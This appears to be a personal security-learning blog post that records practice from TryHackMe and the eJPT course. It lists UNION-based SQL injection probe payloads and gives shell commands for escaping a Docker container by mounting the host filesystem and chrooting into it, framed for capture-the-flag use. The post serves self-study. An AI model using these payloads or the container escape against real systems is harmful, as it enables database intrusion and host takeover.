_posts/2022-03-18-post-sqli.html
---
title:  SQL Injection...
categories:
  - blog
tags:
    - SQLi
    - XSS
---

<p>
As mentioned before, I discoverd a major blindspot on the Basic SQLi. how to perform Union Based enumeration.
Yes thanks for THM to show me how weak my game is there :)
</p>

<p>
So I spend some time on INE eJPT path, to really get into the basics again&#x2026;. and yes it's quite simple if you know and now I know.
</p>

<p>
I quess this is a Enumeration methoth anyone can remember :)
</p>

<div class="org-src-container">
<pre class="src src-sql">'' UNION SELECT NULL--
'' UNION SELECT NULL,NULL--
'' UNION SELECT NULL,NULL,NULL--


'' UNION SELECT 'a',NULL,NULL,NULL--
'' UNION SELECT NULL,'a',NULL,NULL--
'' UNION SELECT NULL,NULL,'a',NULL--
'' UNION SELECT NULL,NULL,NULL,'a'--
</pre>
</div>

<p>
More info can be found here:
<a href="https://portswigger.net/web-security/sql-injection/union-attacks">https://portswigger.net/web-security/sql-injection/union-attacks</a>
</p>


<p>
I spend some time on a CFT on THM, and finally made it. Learning some pritty cool stuff on excaping a docker container.
</p>

<p>
Reference:
<a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation">https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation</a>
</p>

<p>
Basically if you are in the docker group, you can do the following:
</p>

<div class="org-src-container">
<pre class="src src-sh">#Search the socket
find / -name docker.sock 2&gt;/dev/null
#It's usually in /run/docker.sock
</pre>
</div>

<p>
If found, than generate a new image, and mount the host filesystem into you image and chroot into it&#x2026; thats a pretty nice.
Although not that realistic I guess, but good for CTFs
</p>

<div class="org-src-container">
<pre class="src src-sh">#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host
</pre>
</div>
